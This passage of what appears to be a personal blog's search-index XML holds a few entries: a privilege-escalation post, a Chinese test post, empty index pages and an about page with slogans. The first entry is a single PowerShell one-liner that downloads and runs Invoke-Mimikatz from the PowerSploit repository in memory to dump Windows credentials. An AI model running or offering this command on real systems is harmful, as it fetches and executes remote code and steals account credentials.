      <content type="html"><![CDATA[<p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</a>‘); Invoke-Mimikatz -DumpCreds”</p>
]]></content>
      
        <categories>
            
            <category> 提权 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mimikittenz </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[0o0-test]]></title>
      <url>/2017/03/01/0o0-test/</url>
      <content type="html"><![CDATA[<p>测试文章–test—0o0~！！！！！！</p>
]]></content>
      
        
    </entry>
    
  
  
    
    <entry>
      <title></title>
      <url>/categories/index.html</url>
      <content type="html"></content>
    </entry>
    
    <entry>
      <title></title>
      <url>/tags/index.html</url>
      <content type="html"></content>
    </entry>
    
    <entry>
      <title><![CDATA[0o0]]></title>
      <url>/about/index.html</url>
      <content type="html"><![CDATA[<center>&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;</center><br><center>我的地盘我做主！</center><br><center>弹指一挥间，世界皆互联!</center><br><center>&lt;&lt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&lt;&gt;&gt;&gt;&gt;&gt;</center>]]></content>
    </entry>
    
  
</search>
